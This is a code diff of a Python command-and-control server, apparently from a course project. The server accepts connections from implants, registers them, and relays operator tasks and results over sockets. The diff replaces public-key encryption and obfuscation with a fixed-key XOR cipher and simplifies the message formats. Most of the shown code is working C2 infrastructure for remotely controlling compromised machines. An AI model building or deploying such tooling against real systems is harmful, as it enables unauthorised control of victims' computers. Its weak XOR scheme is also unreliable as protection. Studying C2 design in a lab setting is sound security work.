@@ -8,23 +8,15 @@ import struct
 import threading
 import uuid
 
-from helper import (
-    decrypt_message,
-    deobfuscate,
-    deserialize_public_key,
-    encrypt_message,
-    generate_keypair,
-    obfuscate,
-    serialize_public_key,
-)
-
 IMPLANT_HOST = "0.0.0.0"
 IMPLANT_PORT = 9999
 OPERATOR_HOST = "0.0.0.0"
 OPERATOR_PORT = 9998
 OPERATOR_TOKEN = os.environ.get("OPERATOR_TOKEN", "changeme")
 
+_KEY = b"cs564"
 _log_path = os.environ.get("C2_LOG", "c2.log")
+
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s  %(message)s",
@@ -37,8 +29,13 @@ logging.basicConfig(
 log = logging.getLogger("c2")
 
 
+def _xor(data):
+    return bytes(b ^ _KEY[i % len(_KEY)] for i, b in enumerate(data))
+
+
 def _send(conn, data):
-    conn.sendall(struct.pack(">I", len(data)) + data)
+    enc = _xor(data)
+    conn.sendall(struct.pack(">I", len(enc)) + enc)
 
 
 def _recv(conn):
@@ -55,31 +52,25 @@ def _recv(conn):
         if not c:
             raise ConnectionError("closed")
         buf += c
-    return buf
+    return _xor(buf)
 
 
 class ImplantSession(object):
-    def __init__(self, implant_id, conn, priv_key, imp_pub, info):
+    def __init__(self, implant_id, conn, info):
         self.implant_id = implant_id
         self.conn = conn
-        self.priv_key = priv_key
-        self.imp_pub = imp_pub
-        self.info = info  # {hostname, os, user}
+        self.info = info
         self.task_queue = queue.Queue()
 
     def _push(self, command, payload):
         req = {
-            "type": "REQUEST",
             "command": command,
             "request_id": str(uuid.uuid4()),
             "payload": payload,
         }
-        _send(
-            self.conn,
-            obfuscate(encrypt_message(json.dumps(req).encode(), self.imp_pub)),
-        )
+        _send(self.conn, json.dumps(req).encode())
         raw = _recv(self.conn)
-        return json.loads(decrypt_message(deobfuscate(raw), self.priv_key).decode())
+        return json.loads(raw.decode())
 
 
 _sessions = {}
@@ -87,27 +78,17 @@ _sessions_lock = threading.Lock()
 
 
 def _handle_implant(conn, addr):
-    priv_key, pub_key = generate_keypair()
     session = None
     try:
-        imp_pub = deserialize_public_key(_recv(conn))
-        _send(conn, serialize_public_key(pub_key))
-
         raw = _recv(conn)
-        msg = json.loads(decrypt_message(deobfuscate(raw), priv_key).decode())
+        msg = json.loads(raw.decode())
         info = msg.get("payload", {})
 
         implant_id = "IMP-" + str(uuid.uuid4())[:8].upper()
-        session = ImplantSession(implant_id, conn, priv_key, imp_pub, info)
+        session = ImplantSession(implant_id, conn, info)
 
-        ack = {
-            "type": "RESPONSE",
-            "command": "REGISTER",
-            "request_id": msg.get("request_id", ""),
-            "status": "OK",
-            "payload": {"implant_id": implant_id},
-        }
-        _send(conn, obfuscate(encrypt_message(json.dumps(ack).encode(), imp_pub)))
+        ack = {"status": "OK", "implant_id": implant_id}
+        _send(conn, json.dumps(ack).encode())
 
         with _sessions_lock:
             _sessions[implant_id] = session
@@ -124,10 +105,7 @@ def _handle_implant(conn, addr):
             except (ConnectionError, OSError, BrokenPipeError) as exc:
                 log.info("  TASK     %s  %s  SOCKET_DEAD %s", implant_id, command, exc)
                 result_q.put(
-                    {
-                        "status": "error",
-                        "message": "Implant socket closed: {0}".format(exc),
-                    }
+                    {"status": "error", "message": "socket closed: {0}".format(exc)}
                 )
                 break
             except Exception as exc:
@@ -198,15 +176,12 @@ def _handle_operator(conn, addr):
                     try:
                         result = rq.get(timeout=20)
                     except queue.Empty:
-                        result = {
-                            "status": "error",
-                            "message": "Implant timed out (20 s)",
-                        }
+                        result = {"status": "error", "message": "timed out"}
 
             else:
                 result = {
                     "status": "error",
-                    "message": "Unknown action: {0!r}".format(action),
+                    "message": "unknown action: {0!r}".format(action),
                 }
 
             _send(conn, json.dumps(result).encode())
@@ -236,9 +211,7 @@ def _operator_listener():
     srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     srv.bind((OPERATOR_HOST, OPERATOR_PORT))
     srv.listen()
-    log.info(
-        "LISTEN  operators %s:%d  (token auth required)", OPERATOR_HOST, OPERATOR_PORT
-    )
+    log.info("LISTEN  operators %s:%d", OPERATOR_HOST, OPERATOR_PORT)
     while True:
         conn, addr = srv.accept()
         threading.Thread(
@@ -247,7 +220,7 @@ def _operator_listener():
 
 
 if __name__ == "__main__":
-    log.info("C2 server starting  log=%s  token=%s", _log_path, OPERATOR_TOKEN)
+    log.info("C2 starting  token=%s", OPERATOR_TOKEN)
     t1 = threading.Thread(target=_implant_listener, daemon=True)
     t2 = threading.Thread(target=_operator_listener, daemon=True)
     t1.start()
